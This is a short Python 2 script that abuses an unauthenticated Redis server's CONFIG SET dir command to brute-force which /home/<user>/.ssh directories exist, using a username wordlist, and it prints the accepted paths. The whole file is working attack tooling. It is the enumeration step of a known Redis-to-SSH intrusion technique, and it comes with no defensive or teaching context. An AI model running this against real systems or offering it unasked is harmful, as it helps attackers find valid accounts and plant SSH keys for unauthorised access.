import redis

WORDLIST = "usernames.txt"
PATH_TEMPLATE = "/home/%(user)s/.ssh"
REDIS_HOST = '127.0.0.1'
REDIS_PORT = 6379

with open(WORDLIST, "r") as wl:
    usernames = wl.readlines()
    wl.close()

r = redis.StrictRedis(host=REDIS_HOST, port=REDIS_PORT, db=0)

i = 1.0
paths = []
for username in usernames:
    u = username.strip('\r\n')
    path = PATH_TEMPLATE % {'user': u}
    try:
        r.config_set("dir", path)
        paths.append(path)
    except Exception:
        pass
    print ("Progress: %2.3f%%     \r" % ((100*i)/len(usernames))),
    i += 1

print "+---------------------------------------------------------------"
print "| Available paths"
print "+---------------------------------------------------------------"

i = 1
for path in paths:
    print "[%d] %s" % (i, path)
    i += 1
